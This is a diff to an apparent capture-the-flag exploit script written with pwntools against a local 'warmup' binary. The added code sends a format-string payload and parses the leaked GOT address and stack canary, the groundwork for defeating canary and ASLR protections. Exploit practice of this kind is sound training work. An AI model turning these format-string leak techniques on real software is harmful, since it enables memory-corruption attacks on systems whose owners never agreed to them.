@@ -44,6 +44,21 @@ leakAddrStr=b"%20$p %23$p"
 print("ESTABLISHING LIBC")
 libc = ELF("libc.so.6")
 
-# Start Process
+# Start Process and send printf
 p = process("./warmup")
-p.recv()
+p.sendline(leakAddrStr)
+
+# Parse and get leaks
+resp = p.recvuntil(b'\n')  # Should stop at canary
+print("RESPONSE: ", resp)      # Debugging the info it's pulling
+
+# GOT Leak Found
+GOTLeak=p.recvuntil(b' ')
+print("GOT LEAK: ", GOTLeak)
+GOTLeakInt=int(GOTLeak,16)
+
+# Canary Leak found
+canary=p.recvuntil(b'\n')
+print("CANARY: ", canary)
+canaryInt=int(canary,16)
+
